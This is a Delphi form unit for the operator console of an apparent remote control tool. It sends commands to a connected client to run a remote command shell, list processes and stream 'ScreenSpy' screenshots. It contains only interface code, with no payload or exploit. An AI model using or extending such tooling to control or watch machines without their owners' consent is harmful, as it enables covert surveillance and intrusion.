unit FormOperate;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, System.ImageList,
  Vcl.ImgList, Vcl.StdCtrls, UnitClientContext, System.StrUtils, Vcl.Menus,
  Vcl.ExtCtrls;

type
  TOperateForm = class(TForm)
    ImageList_TreeViewMenu: TImageList;
    PageControl_1: TPageControl;
    TabSheet_CmdShell: TTabSheet;
    TabSheet_Processes: TTabSheet;
    Memo_CmdShell: TMemo;
    PopupMenu_CmdShell: TPopupMenu;
    MenuItem_CmdShellActive: TMenuItem;
    ListView_Processes: TListView;
    PopupMenu_Processes: TPopupMenu;
    MenuItem_ProcessesRefresh: TMenuItem;
    TabSheet_ScreenSpy: TTabSheet;
    ScrollBox_ScreenSpy: TScrollBox;
    PaintBox_ScreenSpy: TPaintBox;
    Panel_1: TPanel;
    Button_ScreenSpy_Start: TButton;
    Button_ScreenSpy_End: TButton;
    Label_1: TLabel;
    ComBox_ScreenSpy_Quality: TComboBox;
    procedure Memo_CmdShellKeyPress(Sender: TObject; var Key: Char);
    procedure MenuItem_CmdShellActiveClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure MenuItem_ProcessesRefreshClick(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button_ScreenSpy_StartClick(Sender: TObject);
    procedure Button_ScreenSpy_EndClick(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure PaintBox_ScreenSpyPaint(Sender: TObject);
  private
    { Private declarations }
    CmdShellCommand: AnsiString;
    ScreenSpyBmp: TBitmap;
  public
    { Public declarations }
    ctx: TClientContext;
    procedure AddToCmdShell(s: string);
    procedure SetCmdShellState(b: Boolean);
    procedure ClearProcesses();
    procedure AddProcessesItem(pid, processname: string);
    procedure SetScreenSpyState(b: Boolean);
    procedure ScreenSpyDraw(var mousept, pt: TPoint; var bmp: TBitmap);
  end;

implementation
uses
  UnitGlobal;

{$R *.dfm}

procedure TOperateForm.AddProcessesItem(pid, processname: string);
begin
  with ListView_Processes.Items.Add do
  begin
    Caption := pid;
    SubItems.Add(processname);
  end;
end;

procedure TOperateForm.AddToCmdShell(s: string);
begin
  Memo_CmdShell.Lines.Text := Memo_CmdShell.Lines.Text + s;
  SendMessage(Memo_CmdShell.Handle, WM_VSCROLL, SB_BOTTOM, 0);
  Memo_CmdShell.SelStart := Length(Memo_CmdShell.Lines.Text);
end;

procedure TOperateForm.Button_ScreenSpy_EndClick(Sender: TObject);
begin
  ctx.SendCmd(CMD_STOP_SCREENSPY);
end;

procedure TOperateForm.Button_ScreenSpy_StartClick(Sender: TObject);
var
  quality: DWORD;
begin
  case ComBox_ScreenSpy_Quality.ItemIndex of
  0:
    quality := 1;
  1:
    quality := 4;
  2:
    quality := 8;
  3:
    quality := 16;
  4:
    quality := 32;
  else
    quality := 16;
  end;

  ctx.SendCmd(CMD_BEGIN_SCREENSPY, @quality, SizeOf(quality));
end;

procedure TOperateForm.ClearProcesses;
begin
  ListView_Processes.Items.Clear;
end;

procedure TOperateForm.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if MenuItem_CmdShellActive.Checked then
  begin
    ctx.SendCmd(CMD_STOP_CMDSHELL);
  end;

  if Button_ScreenSpy_End.Enabled then
  begin
    Button_ScreenSpy_EndClick(Self);
  end;
end;

procedure TOperateForm.FormCreate(Sender: TObject);
begin
  SetCmdShellState(False);
  SetScreenSpyState(False);
  ScreenSpyBmp := TBitmap.Create;
end;

procedure TOperateForm.FormDestroy(Sender: TObject);
begin
  FreeAndNil(ScreenSpyBmp);
end;

procedure TOperateForm.Memo_CmdShellKeyPress(Sender: TObject; var Key: Char);
begin
  try
    if Key = #13 then
    begin
      // send cmd
      CmdShellCommand := CmdShellCommand + #13#10;
      ctx.SendCmd(CMD_CMDSHELL_DATA, PAnsiChar(CmdShellCommand), Length(CmdShellCommand) + 1);
      CmdShellCommand := '';
    end else
    if Key = #8 then
    begin
      if Length(CmdShellCommand) > 0 then
      begin
        CmdShellCommand := Copy(CmdShellCommand, 0, Length(CmdShellCommand) - 1);
      end else
        Key := #0;
    end else
    begin
      CmdShellCommand := CmdShellCommand + Key;
    end;
  finally
    SendMessage(Memo_CmdShell.Handle, WM_VSCROLL, SB_BOTTOM, 0);
    Memo_CmdShell.SelStart := Length(Memo_CmdShell.Lines.Text);
  end;
end;

procedure TOperateForm.MenuItem_CmdShellActiveClick(Sender: TObject);
begin
  if not MenuItem_CmdShellActive.Checked then
  begin
    ctx.SendCmd(CMD_BEGIN_CMDSHELL);
  end else
  begin
    ctx.SendCmd(CMD_STOP_CMDSHELL);
  end;
end;

procedure TOperateForm.MenuItem_ProcessesRefreshClick(Sender: TObject);
begin
  ctx.SendCmd(CMD_GET_PROCESS_LIST);
end;

procedure TOperateForm.PaintBox_ScreenSpyPaint(Sender: TObject);
begin
  if Button_ScreenSpy_End.Enabled then
    PaintBox_ScreenSpy.Canvas.Draw(0, 0, ScreenSpyBmp);
end;

procedure TOperateForm.ScreenSpyDraw(var mousept, pt: TPoint; var bmp: TBitmap);
begin
  if bmp.Width > ScreenSpyBmp.Width then
  begin
    ScreenSpyBmp.Width := bmp.Width;
  end;

  if bmp.Height > ScreenSpyBmp.Height then
  begin
    ScreenSpyBmp.Height := bmp.Height;
  end;

  // 先不绘制鼠标了
  ScrollBox_ScreenSpy.HorzScrollBar.Range := ScreenSpyBmp.Width;
  ScrollBox_ScreenSpy.VertScrollBar.Range := ScreenSpyBmp.Height;
  // 保存下镜像先
  ScreenSpyBmp.Canvas.Draw(pt.X, pt.Y, bmp);
  PaintBox_ScreenSpy.Canvas.Draw(pt.X, pt.Y, bmp);
end;

procedure TOperateForm.SetCmdShellState(b: Boolean);
begin
  if b then
  begin
    Memo_CmdShell.ReadOnly := False;
    Memo_CmdShell.Font.Color := clHighlightText;
    Memo_CmdShell.Color := clBlack;
    MenuItem_CmdShellActive.Checked := True;
  end else
  begin
    Memo_CmdShell.ReadOnly := True;
    Memo_CmdShell.Font.Color := clBlack;
    Memo_CmdShell.Color := clScrollBar;
    MenuItem_CmdShellActive.Checked := False;
  end;
end;

procedure TOperateForm.SetScreenSpyState(b: Boolean);
begin
  if b then
  begin
    Button_ScreenSpy_Start.Enabled := False;
    Button_ScreenSpy_End.Enabled := True;
    ComBox_ScreenSpy_Quality.Enabled := False;
  end else
  begin
    Button_ScreenSpy_Start.Enabled := True;
    Button_ScreenSpy_End.Enabled := False;
    ComBox_ScreenSpy_Quality.Enabled := True;
  end;
end;

end.
